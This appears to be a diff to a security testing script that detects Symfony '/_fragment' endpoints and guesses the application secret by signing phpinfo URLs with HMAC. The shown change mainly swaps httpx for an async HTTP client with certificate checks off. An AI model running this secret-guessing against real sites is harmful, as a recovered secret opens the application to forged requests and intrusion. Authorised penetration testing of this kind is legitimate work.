@@ -5,10 +5,12 @@
 
 import os
 import sys
+import asyncio
 import hashlib
 import argparse
-import httpx
 from contextlib import suppress
+
+from blasthttp import BlastHTTP
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 sys.path.append(os.path.dirname(SCRIPT_DIR))
@@ -54,17 +56,28 @@ def main():
     if args.user_agent:
         headers["User-agent"] = args.user_agent
 
+    client = BlastHTTP()
+    header_tuples = list(headers.items())
+
+    async def _get(url):
+        return await client.request(
+            url,
+            method="GET",
+            headers=header_tuples,
+            verify_certs=False,
+            follow_redirects=True,
+            proxy=proxy,
+        )
+
     fragment_test_url = f"{args.url.rstrip('/')}/_fragment"
     try:
-        res_fragment = httpx.get(
-            f"{fragment_test_url}", proxy=proxy, headers=headers, verify=False, follow_redirects=True
-        )
-    except (httpx.ConnectError, httpx.ConnectTimeout):
+        res_fragment = asyncio.run(_get(fragment_test_url))
+    except RuntimeError:
         print(f"Error connecting to URL: [{args.url}]")
         return
 
     negative_test_url = f"{args.url.rstrip('/')}/AAAAAAAA"
-    res_random = httpx.get(f"{negative_test_url}", proxy=proxy, headers=headers, verify=False, follow_redirects=True)
+    res_random = asyncio.run(_get(negative_test_url))
 
     if (res_fragment.status_code != 403) or res_random.status_code == res_fragment.status_code:
         print(f"Not a Symfony app, or _fragment functionality not enabled...")
@@ -82,7 +95,7 @@ def main():
             for hash_algorithm in [hashlib.sha256, hashlib.sha1]:
                 hash_value = x.symfonyHMAC(phpinfo_test_url, secret, hash_algorithm)
                 test_url = f"{phpinfo_test_url}&_hash={hash_value.decode()}"
-                test_res = httpx.get(f"{test_url}", proxy=proxy, headers=headers, verify=False, follow_redirects=True)
+                test_res = asyncio.run(_get(test_url))
                 if "PHP Authors" in test_res.text:
                     print(test_url)
                     print(f"Found Symfony Secret! [{secret}]")
